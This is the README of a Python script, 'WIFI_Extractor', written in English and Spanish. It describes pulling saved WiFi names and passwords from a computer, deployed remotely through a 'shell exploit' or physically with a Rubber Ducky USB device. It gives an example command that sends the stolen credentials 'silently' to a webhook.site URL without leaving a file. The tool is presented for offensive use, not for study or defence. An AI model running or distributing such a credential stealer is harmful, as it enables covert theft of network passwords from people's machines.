# WIFI_Extractor

you might need this requeriments
Tal vez podrias necesitar estos requerimientos


pip install click

pip install elementpath

pip install requests

Script to extract WIFI passwords from a pc uploading it remotely (shell exploit) and send it to a url "silently"(webhook without leaving files 
and also can be used offline, physically (rubby ducky)

Script para extraer contraseñas WIFI de un pc subiendolo remotamente(shell exploit) y enviarlo a una url "silenciosamente"(webhook) 
Tambien se puede usar offline, físicamente con un pendrive(rubby ducky)

Usage: E_WIFI.py [OPTIONS]


Options:

  -u, --url TEXT      Webhook/POST URL
  
  -o, --only-webhook  Only send data to webhook (whithout creating the txt file) need to specify the url with -u Envía los datos
                      solo a la webhook (sin crear el archivo txt) necesitas especificar la url con -u
                      
  -v, --version       Imprime la version | Prints the version
  
  --help              Show this message and exit.
  

Offline

python3 E_WIFIoffline.py

Creates a txt with the WIFI's ssid and passwords stored in the local machine
Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local

Online

Usages

default usage
python3 E_WIFI.py

Creates a txt with the WIFI's ssid and passwords stored in the local machine
Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local

silent: Only webhook, no txt file

python3 E_WIFI.py -u https://webhook.site/yoururl -o

type --help for more detailed info

